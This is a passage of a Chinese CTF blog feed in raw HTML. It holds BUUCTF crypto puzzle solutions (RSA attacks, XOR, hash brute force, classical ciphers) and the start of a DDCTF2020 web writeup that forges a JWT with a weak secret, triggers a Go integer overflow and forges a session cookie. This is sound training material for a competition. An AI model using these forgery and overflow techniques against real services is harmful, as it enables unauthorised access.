class="number">-1</span>)%i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> n%(((dp*e<span class="number">-1</span>)//i)+<span class="number">1</span>)==<span class="number">0</span>:</span><br><span class="line">                p=((dp*e<span class="number">-1</span>)//i)+<span class="number">1</span></span><br><span class="line">                q=n//(((dp*e<span class="number">-1</span>)//i)+<span class="number">1</span>)</span><br><span class="line">                phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">                d = gmpy2.invert(e,phi)%phi</span><br><span class="line">                <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span></span><br><span class="line">dp = <span class="number">905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span></span><br><span class="line">c = <span class="number">140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span></span><br><span class="line">d=getd(n,e,dp)</span><br><span class="line">m=pow(c,d,n)</span><br><span class="line">print(libnum.n2s(m))</span><br></pre></td></tr></table></figure><h3 id="异性相吸"><a href="#异性相吸" class="headerlink" title="异性相吸"></a>异性相吸</h3><p>题目：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">asadsasdasdasdasdasdasdasdasdasdqwesqf</span><br><span class="line"></span><br><span class="line">ἇ̀Ј唒ဃ塔屋䩘卖剄䐃堂ن䝔嘅均ቄ䩝ᬔ</span><br></pre></td></tr></table></figure><p>异性相吸，异或？可以看到两个文件大小是相等的</p><p><img src="/2020/09/21/buuctf-crypto%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200923094353.png"></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s1 = open(<span class="string">&#x27;1.txt&#x27;</span>).read()</span><br><span class="line">s2 = open(<span class="string">&#x27;key.txt&#x27;</span>).read()</span><br><span class="line"><span class="keyword">for</span> i,j <span class="keyword">in</span> zip(s1,s2):</span><br><span class="line">    print(chr(ord(i)^ord(j)),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="RSA-1"><a href="#RSA-1" class="headerlink" title="RSA"></a>RSA</h3><p>给了两个文件<code>flag.enc</code>和<code>pub.key</code>,先提取出n和e，再用yafu分解出p和q</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">path = <span class="string">&#x27;pub.key&#x27;</span></span><br><span class="line"><span class="keyword">with</span> open(path) <span class="keyword">as</span> f:</span><br><span class="line">    key = RSA.import_key(f.read())</span><br><span class="line">    print(<span class="string">&#x27;e = %d&#x27;</span> % key.e)</span><br><span class="line">    print(<span class="string">&#x27;n = %d&#x27;</span> % key.n)</span><br></pre></td></tr></table></figure><p><img src="/2020/09/21/buuctf-crypto%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200923132811.png"></p><p>接着生成私钥,python2脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">keypair = RSA.generate(<span class="number">1024</span>)</span><br><span class="line">keypair.p = <span class="number">304008741604601924494328155975272418463</span></span><br><span class="line">keypair.q = <span class="number">285960468890451637935629440372639283459</span></span><br><span class="line">keypair.e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">keypair.n = keypair.p * keypair.q  </span><br><span class="line">Qn = long((keypair.p<span class="number">-1</span>) * (keypair.q<span class="number">-1</span>)) </span><br><span class="line"></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">True</span>):</span><br><span class="line">    x = (Qn * i ) + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> (x % keypair.e == <span class="number">0</span>):</span><br><span class="line">        keypair.d = x / keypair.e  </span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">private = open(<span class="string">&#x27;private.pem&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) </span><br><span class="line">private.write(keypair.exportKey()) </span><br><span class="line">private.close()</span><br></pre></td></tr></table></figure><p>接着用openssl解密得到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -decrypt -<span class="keyword">in</span> flag.enc -inkey private.pem -out flag.txt</span><br></pre></td></tr></table></figure><h3 id="还原大师"><a href="#还原大师" class="headerlink" title="还原大师"></a>还原大师</h3><p>题目：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们得到了一串神秘字符串：TASC?O3RJMV?WDJKX?ZM,问号部分是未知大写字母，为了确定这个神秘字符串，我们通过了其他途径获得了这个字串的32位MD5码。但是我们获得它的32位MD5码也是残缺不全，E903???4DAB????08?????51?80??8A?,请猜出神秘字符串的原本模样，并且提交这个字串的32位MD5码作为答案。 注意：得到的 flag 请包上 flag&#123;&#125; 提交</span><br></pre></td></tr></table></figure><p>根据题意写脚本爆破就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">BigStr  = string.ascii_uppercase</span><br><span class="line">s1 = <span class="string">&#x27;TASC&#123;&#125;O3RJMV&#123;&#125;WDJKX&#123;&#125;ZM&#x27;</span></span><br><span class="line">s2 = <span class="string">&#x27;E903???4DAB????08?????51?80??8A?&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> BigStr:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> BigStr:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> BigStr:</span><br><span class="line">            s = s1.format(i,j,k)</span><br><span class="line">            smd5 = hashlib.md5(str(s).encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">            flag = re.search(s2.replace(<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;.&#x27;</span>),smd5.upper())</span><br><span class="line">            <span class="keyword">if</span> flag!=<span class="literal">None</span>:</span><br><span class="line">                print(s,smd5.upper())</span><br></pre></td></tr></table></figure><h3 id="robomunication"><a href="#robomunication" class="headerlink" title="robomunication"></a>robomunication</h3><p>听出来是摩斯密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.... . .-.. .-.. --- .-- .... .- - .. ... - .... . -.- . -.-- .. - .. ... -... --- --- .--. -... . . .--.</span><br></pre></td></tr></table></figure><p>解密得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HELLOWHATISTHEKEYITISBOOPBEEP</span><br></pre></td></tr></table></figure><p>flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;BOOPBEEP&#125;</span><br></pre></td></tr></table></figure><h3 id="RSAROLL"><a href="#RSAROLL" class="headerlink" title="RSAROLL"></a>RSAROLL</h3><p>题目：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&#123;920139713,19&#125;</span><br><span class="line"></span><br><span class="line">704796792</span><br><span class="line">752211152</span><br><span class="line">274704164</span><br><span class="line">18414022</span><br><span class="line">368270835</span><br><span class="line">483295235</span><br><span class="line">263072905</span><br><span class="line">459788476</span><br><span class="line">483295235</span><br><span class="line">459788476</span><br><span class="line">663551792</span><br><span class="line">475206804</span><br><span class="line">459788476</span><br><span class="line">428313374</span><br><span class="line">475206804</span><br><span class="line">459788476</span><br><span class="line">425392137</span><br><span class="line">704796792</span><br><span class="line">458265677</span><br><span class="line">341524652</span><br><span class="line">483295235</span><br><span class="line">534149509</span><br><span class="line">425392137</span><br><span class="line">428313374</span><br><span class="line">425392137</span><br><span class="line">341524652</span><br><span class="line">458265677</span><br><span class="line">263072905</span><br><span class="line">483295235</span><br><span class="line">828509797</span><br><span class="line">341524652</span><br><span class="line">425392137</span><br><span class="line">475206804</span><br><span class="line">428313374</span><br><span class="line">483295235</span><br><span class="line">475206804</span><br><span class="line">459788476</span><br><span class="line">306220148</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RSA roll！roll！roll！</span><br><span class="line">Only number and a-z</span><br><span class="line">（don&#39;t use editor</span><br><span class="line">which MS provide）</span><br></pre></td></tr></table></figure><p>很明显可以猜到<code>&#123;920139713,19&#125;</code>是私钥，那些数字都是密文，exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分解大整数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">moder</span>(<span class="params">n</span>):</span></span><br><span class="line">    base=<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> base &lt;math.sqrt(n):</span><br><span class="line">        <span class="keyword">if</span>(n%base==<span class="number">0</span>):</span><br><span class="line">            fbase=base</span><br><span class="line">            print(base,int(n/base))</span><br><span class="line">        base+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">    f=getEuler(fbase,int(n/fbase))</span><br><span class="line">    print(<span class="string">&#x27;f(n)欧拉函数值：%d&#x27;</span>%f)<span class="comment">#</span></span><br><span class="line">    <span class="keyword">return</span> f</span><br><span class="line"><span class="comment"># 求欧拉函数f(n)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getEuler</span>(<span class="params">prime1, prime2</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (prime1<span class="number">-1</span>)*(prime2<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求私钥d</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getDkey</span>(<span class="params">e, Eulervalue</span>):</span><span class="comment">#可以辗转相除法</span></span><br><span class="line">    k = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> (((Eulervalue * k) + <span class="number">1</span>) % e) == <span class="number">0</span>:</span><br><span class="line">            (d,m)=divmod(Eulervalue * k + <span class="number">1</span>,e)</span><br><span class="line">            <span class="keyword">return</span> d<span class="comment">#避免科学计数法最后转int失去精度</span></span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n=<span class="number">920139713</span></span><br><span class="line">d =getDkey(<span class="number">19</span>, moder(n))</span><br><span class="line">print(<span class="string">&#x27;私钥为： %d&#x27;</span>%d)</span><br><span class="line">c=[<span class="number">704796792</span>,<span class="number">752211152</span>,<span class="number">274704164</span>,<span class="number">18414022</span>,<span class="number">368270835</span>,<span class="number">483295235</span>,<span class="number">263072905</span>,<span class="number">459788476</span>,<span class="number">483295235</span>,<span class="number">459788476</span>,<span class="number">663551792</span>,<span class="number">475206804</span>,</span><br><span class="line">   <span class="number">459788476</span>,<span class="number">428313374</span>,<span class="number">475206804</span>,<span class="number">459788476</span>,<span class="number">425392137</span>,<span class="number">704796792</span>,<span class="number">458265677</span>,<span class="number">341524652</span>,<span class="number">483295235</span>,<span class="number">534149509</span>,<span class="number">425392137</span>,<span class="number">428313374</span>,</span><br><span class="line">   <span class="number">425392137</span>,<span class="number">341524652</span>,<span class="number">458265677</span>,<span class="number">263072905</span>,<span class="number">483295235</span>,<span class="number">828509797</span>,<span class="number">341524652</span>,<span class="number">425392137</span>,<span class="number">475206804</span>,<span class="number">428313374</span>,<span class="number">483295235</span>,<span class="number">475206804</span>,<span class="number">459788476</span>,<span class="number">306220148</span>]</span><br><span class="line">L=[]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> c:</span><br><span class="line">    L.append(pow(x,d,n))</span><br><span class="line">print(L)<span class="comment">#明文ascii表</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> L:</span><br><span class="line">    print(chr(x),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="Cipher"><a href="#Cipher" class="headerlink" title="Cipher"></a>Cipher</h3><p>题目：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">还能提示什么呢？公平的玩吧（密钥自己找） Dncnoqqfliqrpgeklwmppu 注意：得到的 flag 请包上 flag&#123;&#125; 提交, flag&#123;小写字母&#125;</span><br></pre></td></tr></table></figure><p>从公平玩吧联想到<code>Playfair Cipher</code>：<a href="http://rumkin.com/tools/cipher/playfair.php">http://rumkin.com/tools/cipher/playfair.php</a></p><p>直接解密，密码是<code>playfair</code>，注意要小写</p><h3 id="Unencode"><a href="#Unencode" class="headerlink" title="Unencode"></a>Unencode</h3><p>uuencode解密得到flag:<a href="http://ctf.ssleye.com/uu.html">http://ctf.ssleye.com/uu.html</a></p><h3 id="Dangerous-RSA"><a href="#Dangerous-RSA" class="headerlink" title="Dangerous RSA"></a>Dangerous RSA</h3><p>题目：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#n:  0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793L</span><br><span class="line">#e:  0x3</span><br><span class="line">#c:0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365</span><br><span class="line">so,how to get the message?</span><br></pre></td></tr></table></figure><p>低加密指数小明文攻击，exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">n = <span class="number">0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872</span></span><br><span class="line">e = <span class="number">0x3</span></span><br><span class="line">c = <span class="number">0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365</span></span><br><span class="line"></span><br><span class="line">m = gmpy2.iroot(c, <span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line">print(libnum.n2s(m))</span><br></pre></td></tr></table></figure><h3 id="达芬奇密码"><a href="#达芬奇密码" class="headerlink" title="达芬奇密码"></a>达芬奇密码</h3><p>题目：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">达芬奇隐藏在蒙娜丽莎中的数字列:1 233 3 2584 1346269 144 5 196418 21 1597 610 377 10946 89 514229 987 8 55 6765 2178309 121393 317811 46368 4181 1 832040 2 28657 75025 34 13 17711 </span><br><span class="line">记录在达芬奇窗台口的神秘数字串:36968853882116725547342176952286</span><br></pre></td></tr></table></figure><p>发现上面的数字列的个数和下面的数字串长度是一样的，都是32，仔细看上面，发现是斐波那契数列，并且是乱序的，猜测下面的和上面的顺序一样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;1 233 3 2584 1346269 144 5 196418 21 1597 610 377 10946 89 514229 987 8 55 6765 2178309 121393 317811 46368 4181 1 832040 2 28657 75025 34 13 17711&#x27;</span></span><br><span class="line">s1 = <span class="string">&#x27;36968853882116725547342176952286&#x27;</span></span><br><span class="line">n0 = <span class="number">1</span> </span><br><span class="line">n1 = <span class="number">1</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">li=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s.split(<span class="string">&#x27; &#x27;</span>):</span><br><span class="line">    li.append(i)</span><br><span class="line">flag+=s1[li.index(<span class="string">&#x27;1&#x27;</span>)]</span><br><span class="line">flag+=s1[li.index(<span class="string">&#x27;1&#x27;</span>,<span class="number">10</span>)]</span><br><span class="line"><span class="keyword">while</span> len(flag)&lt;<span class="number">32</span>:</span><br><span class="line">    n = n0+n1</span><br><span class="line">    n0=n1</span><br><span class="line">    n1=n</span><br><span class="line">    flag+=s1[li.index(str(n))]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="AFCTF2018-Morse"><a href="#AFCTF2018-Morse" class="headerlink" title="[AFCTF2018]Morse"></a>[AFCTF2018]Morse</h3><p>摩斯密码直接解</p><h3 id="HDCTF2019-basic-rsa"><a href="#HDCTF2019-basic-rsa" class="headerlink" title="[HDCTF2019]basic rsa"></a>[HDCTF2019]basic rsa</h3><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> a2b_hex,b2a_hex</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;*****************&quot;</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">262248800182277040650192055439906580479</span></span><br><span class="line">q = <span class="number">262854994239322828547925595487519915551</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65533</span></span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">c = pow(int(b2a_hex(flag),<span class="number">16</span>),e,n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> c</span><br><span class="line"></span><br><span class="line"><span class="comment"># 27565231154623519221597938803435789010285480123476977081867877272451638645710</span></span><br></pre></td></tr></table></figure><p>就基本的RSA，exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">p = <span class="number">262248800182277040650192055439906580479</span></span><br><span class="line">q = <span class="number">262854994239322828547925595487519915551</span></span><br><span class="line">e = <span class="number">65533</span></span><br><span class="line">c = <span class="number">27565231154623519221597938803435789010285480123476977081867877272451638645710</span></span><br><span class="line">d = gmpy2.invert(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">m = pow(c, d, p*q)</span><br><span class="line">print(libnum.n2s(m))</span><br></pre></td></tr></table></figure><h3 id="传感器"><a href="#传感器" class="headerlink" title="传感器"></a>传感器</h3><p>题目:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">5555555595555A65556AA696AA6666666955</span><br><span class="line">这是某压力传感器无线数据包解调后但未解码的报文(hex)</span><br><span class="line">  </span><br><span class="line">已知其ID为0xFED31F，请继续将报文完整解码，提交hex。</span><br><span class="line"></span><br><span class="line">提示1：曼联</span><br></pre></td></tr></table></figure><p>提示曼联，想到曼彻斯特密码，每8位反序</p><h3 id="rsa2"><a href="#rsa2" class="headerlink" title="rsa2"></a>rsa2</h3><p>题目:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">N = <span class="number">101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471</span></span><br><span class="line">e = <span class="number">46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span> + hashlib.md5(hex(d)).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DDCTF2020部分题目writeup</title>
      <link href="2020/09/06/DDCTF2020-writeup/"/>
      <url>2020/09/06/DDCTF2020-writeup/</url>
      
        <content type="html"><![CDATA[<p>难哭了！😭</p><a id="more"></a><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Web签到题"><a href="#Web签到题" class="headerlink" title="Web签到题"></a>Web签到题</h3><p>传下参，很明显是JWT</p><img src="/2020/09/06/DDCTF2020-writeup/QQ截图20200906112009.png" style="zoom:80%;"><p>将<code>userRole</code>改成<code>ADMIN</code>，密钥设置成<code>admin</code>成功得到客户端，后来才知道这个密码好像和用户名一样</p><img src="/2020/09/06/DDCTF2020-writeup/QQ截图20200906112149.png" style="zoom:80%;"><p><img src="/2020/09/06/DDCTF2020-writeup/QQ%E6%88%AA%E5%9B%BE20200906112333.png"></p><p>接着就不会了</p><h3 id="卡片商店"><a href="#卡片商店" class="headerlink" title="卡片商店"></a>卡片商店</h3><p>go语言整数溢出漏洞，直接向朋友借1844674407370955161个发现</p><p><img src="/2020/09/06/DDCTF2020-writeup/QQ%E6%88%AA%E5%9B%BE20200906113159.png"></p><p>很明显发生了溢出，然后把借的还了兑换礼物就能得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url: &#x2F;flag , SecKey: Udc13VD5adM_c10nPxFu@v12</span><br></pre></td></tr></table></figure><p>访问提示不是幸运玩家，找到伪造cookie：<a href="https://github.com/EddieIvan01/secure-cookie-faker">https://github.com/EddieIvan01/secure-cookie-faker</a></p><p><img src="/2020/09/06/DDCTF2020-writeup/QQ%E6%88%AA%E5%9B%BE20200906114250.png"></p><h3 id="Overwrite-Me"><a href="#Overwrite-Me" class="headerlink" title="Overwrite Me"></a>Overwrite Me</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span 